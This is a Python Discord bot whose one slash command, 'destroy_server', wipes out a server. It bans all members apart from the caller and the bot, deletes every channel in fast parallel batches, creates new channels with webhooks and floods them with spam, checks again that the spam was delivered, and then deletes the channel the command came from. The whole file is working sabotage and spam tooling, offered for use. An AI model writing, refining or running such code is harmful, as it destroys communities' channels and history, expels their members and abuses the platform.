import os
import asyncio
import discord
from discord import app_commands
from discord.ext import commands


class MyBot(commands.Bot):

    def __init__(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.guild_messages = True
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("تم مزامنة أوامر السلاش بنجاح.")


bot = MyBot()


@bot.event
async def on_ready():
    print(f"تم تسجيل الدخول باسم: {bot.user}")


# دالة إرسال السبام للويب هوك بسرعة عالية
async def send_webhook_spams(
    webhook: discord.Webhook, message: str, count: int
):
    tasks = [webhook.send(content=message) for _ in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)


@bot.tree.command(
    name="destroy_server",
    description="أمر تدمير السيرفر السريع مع الفحص والتعويض التلقائي لضمان عدم التفويت",
)
@app_commands.describe(
    room_name="اسم الرومات الجديدة (بدون أرقام)",
    rooms_count="عدد الرومات المراد إنشاؤها",
    webhook_name="اسم الويب هوك",
    message_content="محتوى رسالة السبام",
    messages_count="عدد الرسائل في كل روم",
)
async def destroy_server(
    interaction: discord.Interaction,
    room_name: str,
    rooms_count: int,
    webhook_name: str,
    message_content: str,
    messages_count: int,
):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "يجب أن تكون مشرفاً لاستخدام هذا الأمر.", ephemeral=True
        )
        return

    await interaction.response.send_message(
        "جاري التنفيذ السريع مع نظام التأمين الشامل...", ephemeral=True
    )
    guild = interaction.guild

    # 1. حظر الأعضاء دفعة واحدة
    async def ban_member(member):
        if member.id == bot.user.id or member.id == interaction.user.id:
            return
        try:
            await guild.ban(member, reason="تدمير السيرفر")
        except Exception as e:
            print(f"فشل حظر {member.name}: {e}")

    ban_tasks = [ban_member(m) for m in guild.members]

    # 2. حذف الرومات بدفعات متوازية سريعة تمنع التوقف
    channels_to_delete = [
        c for c in guild.channels if c.id != interaction.channel.id
    ]

    async def delete_batch(channels):
        tasks = []
        for channel in channels:

            async def delete_single(ch):
                try:
                    await ch.delete()
                except Exception as e:
                    print(f"فشل حذف الروم {ch.name}: {e}")

            tasks.append(delete_single(channel))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    # تقسيم الرومات إلى دفعات سريعة جداً
    batch_size = 5
    channel_batches = [
        channels_to_delete[i : i + batch_size]
        for i in range(0, len(channels_to_delete), batch_size)
    ]

    async def delete_all_in_batches():
        for batch in channel_batches:
            await delete_batch(batch)
            await asyncio.sleep(0.02)

    # 3. إنشاء الرومات والويب هوكات والسبام مع ضمان الإرسال
    category = interaction.channel.category
    created_channels = []

    async def create_and_spam(i):
        try:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(
                    send_messages=True, view_channel=True
                )
            }
            if category:
                channel = await guild.create_text_channel(
                    room_name, category=category, overwrites=overwrites
                )
            else:
                channel = await guild.create_text_channel(
                    room_name, overwrites=overwrites
                )

            created_channels.append(channel)
            
            # إنشاء الويب هوك
            webhook = await channel.create_webhook(name=webhook_name)
            
            # مهلة ميكروثانية لا تذكر لضمان تسجيل الويب هوك لدى ديسكورد
            await asyncio.sleep(0.03)
            
            # إرسال الرسائل
            await send_webhook_spams(webhook, message_content, messages_count)
        except Exception as e:
            print(f"خطأ في إنشاء الروم: {e}")

    create_tasks = [create_and_spam(i) for i in range(1, rooms_count + 1)]

    # إطلاق العمليات الأساسية معاً
    await asyncio.gather(
        asyncio.gather(*ban_tasks, return_exceptions=True),
        delete_all_in_batches(),
        asyncio.gather(*create_tasks, return_exceptions=True),
        return_exceptions=True,
    )

    # **فحص وتعويض فوري لأي روم ما وصلته الرسائل**
    async def check_and_fix(channel):
        try:
            webhooks = await channel.webhooks()
            if not webhooks:
                webhook = await channel.create_webhook(name=webhook_name)
                await asyncio.sleep(0.02)
                await send_webhook_spams(webhook, message_content, messages_count)
            else:
                await send_webhook_spams(webhooks[0], message_content, messages_count)
        except:
            pass

    fix_tasks = [check_and_fix(ch) for ch in created_channels if ch in guild.channels]
    if fix_tasks:
        await asyncio.gather(*fix_tasks, return_exceptions=True)

    # حذف الروم الحالي بالآخر
    try:
        await interaction.channel.delete()
    except:
        pass


MASTERGUARD_TOKEN = os.environ.get('MASTERGUARD_TOKEN')
bot.run(MASTERGUARD_TOKEN)
